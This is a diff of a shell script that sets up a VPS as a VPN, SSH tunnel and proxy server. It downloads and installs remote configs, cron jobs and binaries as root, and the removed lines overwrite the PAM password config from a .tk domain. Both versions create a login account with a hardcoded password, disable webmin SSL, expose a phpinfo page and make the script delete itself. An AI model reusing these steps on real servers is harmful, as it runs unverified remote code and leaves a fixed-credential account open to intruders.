@@ -90,50 +90,55 @@ echo "screenfetch" >> .bash_profile
 #echo "clear" >> .profile
 #echo "screenfetch" >> .profile
 
-# script
-wget -O /etc/pam.d/common-password "http://autoscriptnobita.tk/rendum/common-password"
-chmod +x /etc/pam.d/common-password
-service exim4 stop;sysv-rc-conf exim4 off;
-# webmin
-apt-get -y install webmin
-sed -i 's/ssl=1/ssl=0/g' /etc/webmin/miniserv.conf
-# dropbear
-apt-get -y install dropbear
-wget -O /etc/default/dropbear "http://autoscriptnobita.tk/rendum/dropbear"
-echo "/bin/false" >> /etc/shells
-echo "/usr/sbin/nologin" >> /etc/shells
-# squid3
-apt-get -y install squid3
-wget -O /etc/squid3/squid.conf "http://autoscriptnobita.tk/rendum/squid.conf"
-wget -O /etc/squid/squid.conf "http://autoscriptnobita.tk/rendum/squid.conf"
-sed -i "s/ipserver/$myip/g" /etc/squid3/squid.conf
-sed -i "s/ipserver/$myip/g" /etc/squid/squid.conf
-# openvpn
-apt-get -y install openvpn
-wget -O /etc/openvpn/openvpn.tar "http://autoscriptnobita.tk/rendum/openvpn.tar"
-cd /etc/openvpn/;tar xf openvpn.tar;rm openvpn.tar
-wget -O /etc/rc.local "http://autoscriptnobita.tk/rendum/rc.local";chmod +x /etc/rc.local
-#wget -O /etc/iptables.up.rules "http://rzvpn.net/random/iptables.up.rules"
-#sed -i "s/ipserver/$myip/g" /etc/iptables.up.rules
-#iptables-restore < /etc/iptables.up.rules
-# nginx
-apt-get -y install nginx php-fpm php-mcrypt php-cli libexpat1-dev libxml-parser-perl
+# install webserver
+cd
 rm /etc/nginx/sites-enabled/default
 rm /etc/nginx/sites-available/default
-wget -O /etc/php/7.0/fpm/pool.d/www.conf "http://rzvpn.net/random/www.conf"
+wget -O /etc/nginx/nginx.conf "https://raw.githubusercontent.com/chunyen91/Ford_7752/master/vervpn8/nginx.conf"
 mkdir -p /home/vps/public_html
-echo "<pre>Setup by Noba95 | telegram @OrangKuatSabahanTerkini | website OrangKuatSabahanTerkini.tk</pre>" > /home/vps/public_html/index.php
+echo "<pre>Powered By Fawzya.Net</pre>" > /home/vps/public_html/index.html
 echo "<?php phpinfo(); ?>" > /home/vps/public_html/info.php
-wget -O /etc/nginx/conf.d/vps.conf "http://autoscriptnobita.tk/rendum/vps.conf"
-sed -i 's/listen = \/var\/run\/php7.0-fpm.sock/listen = 127.0.0.1:9000/g' /etc/php/7.0/fpm/pool.d/www.conf
+wget -O /etc/nginx/conf.d/vps.conf "https://raw.githubusercontent.com/chunyen91/Ford_7752/master/vervpn8/vps.conf"
+sed -i 's/listen = \/var\/run\/php5-fpm.sock/listen = 127.0.0.1:9000/g' /etc/php5/fpm/pool.d/www.conf
+service php5-fpm restart
+service nginx restart
+service nginx restart
+
+# openvpn
+apt-get -y install openvpn
+cd /etc/openvpn/
+wget https://raw.githubusercontent.com/chunyen91/Ford_7752/master/vervpn8/openvpn.tar;tar xf openvpn.tar;rm openvpn.tar
+wget -O /etc/iptables.up.rules "https://raw.githubusercontent.com/chunyen91/Ford_7752/master/vervpn8/iptables.up.rules"
+sed -i '$ i\iptables-restore < /etc/iptables.up.rules' /etc/rc.local
+sed -i "s/ipserver/$myip/g" /etc/iptables.up.rules
+iptables-restore < /etc/iptables.up.rules
 # etc
-wget -O /home/vps/public_html/client.ovpn "http://autoscriptnobita.tk/rendum/client.ovpn"
-sed -i 's/AcceptEnv/#AcceptEnv/g' /etc/ssh/sshd_config
+wget -O /home/vps/public_html/client.ovpn "https://raw.githubusercontent.com/chunyen91/Ford_7752/master/vervpn8/client.ovpn"
 sed -i "s/ipserver/$myip/g" /home/vps/public_html/client.ovpn
-useradd -m -g users -s /bin/bash archangels
-echo "7C22C4ED" | chpasswd
-echo "UPDATE DAN INSTALL SIAP 99% MOHON SABAR"
-cd;rm *.sh;rm *.txt;rm *.tar;rm *.deb;rm *.asc;rm *.zip;rm ddos*;
+cd;wget https://raw.githubusercontent.com/chunyen91/Ford_7752/master/vervpn8/cronjob.tar
+tar xf cronjob.tar;mv uptime.php /home/vps/public_html/
+mv usertol userssh uservpn /usr/bin/;mv cronvpn cronssh /etc/cron.d/
+chmod +x /usr/bin/usertol;chmod +x /usr/bin/userssh;chmod +x /usr/bin/uservpn;
+useradd -m -g users -s /bin/bash dragon
+echo "Wutoh:369" | chpasswd
+echo "UPDATE AND INSTALL COMPLETE COMPLETE 99% BE PATIENT"
+rm $0;rm *.txt;rm *.tar;rm *.deb;rm *.asc;rm *.zip;rm ddos*;
+clear
+
+# setting port ssh
+sed -i '/Port 22/a Port 143' /etc/ssh/sshd_config
+sed -i '/Port 22/a Port  90' /etc/ssh/sshd_config
+sed -i 's/Port 22/Port  22/g' /etc/ssh/sshd_config
+service ssh restart
+
+# install dropbear
+apt-get -y install dropbear
+sed -i 's/NO_START=1/NO_START=0/g' /etc/default/dropbear
+sed -i 's/DROPBEAR_PORT=22/DROPBEAR_PORT=443/g' /etc/default/dropbear
+sed -i 's/DROPBEAR_EXTRA_ARGS=/DROPBEAR_EXTRA_ARGS="-p 109 -p 110"/g' /etc/default/dropbear
+sed -i 's/DROPBEAR_BANNER=""/DROPBEAR_BANNER="\/etc\/issue.net"/g' /etc/default/dropbear
+echo "/bin/false" >> /etc/shells
+service dropbear restart
 
 # install vnstat gui
 cd /home/vps/public_html/
@@ -148,6 +153,52 @@ sed -i "s/\$language = 'nl';/\$language = 'en';/g" config.php
 sed -i 's/Internal/Internet/g' config.php
 sed -i '/SixXS IPv6/d' config.php
 cd
+
+# install squid3
+apt-get -y install squid3
+cat > /etc/squid3/squid.conf <<-END
+acl localhost src 127.0.0.1/32 ::1
+acl to_localhost dst 127.0.0.0/8 0.0.0.0/32 ::1
+acl SSL_ports port 443
+acl Safe_ports port 80
+acl Safe_ports port 21
+acl Safe_ports port 443
+acl Safe_ports port 70
+acl Safe_ports port 210
+acl Safe_ports port 1025-65535
+acl Safe_ports port 280
+acl Safe_ports port 488
+acl Safe_ports port 591
+acl Safe_ports port 777
+acl CONNECT method CONNECT
+acl SSH dst xxxxxxxxx-xxxxxxxxx/32
+http_access allow SSH
+http_access allow manager localhost
+http_access deny manager
+http_access allow localhost
+http_access deny all
+http_port 8080
+http_port 8000
+http_port 80
+coredump_dir /var/spool/squid3
+refresh_pattern ^ftp: 1440 20% 10080
+refresh_pattern ^gopher: 1440 0% 1440
+refresh_pattern -i (/cgi-bin/|\?) 0 0% 0
+refresh_pattern . 0 20% 4320
+visible_hostname Proxy.0109475453.net
+END
+sed -i $MYIP2 /etc/squid3/squid.conf;
+service squid3 restart
+
+# install webmin
+cd
+wget "https://raw.githubusercontent.com/chunyen91/0109475453/master/webmin_1.801_all.deb"
+dpkg --install webmin_1.801_all.deb;
+apt-get -y -f install;
+sed -i 's/ssl=1/ssl=0/g' /etc/webmin/miniserv.conf
+rm /root/webmin_1.801_all.deb
+service webmin restart
+service vnstat restart
 
 # install fail2ban
 apt-get -y install fail2ban;service fail2ban restart
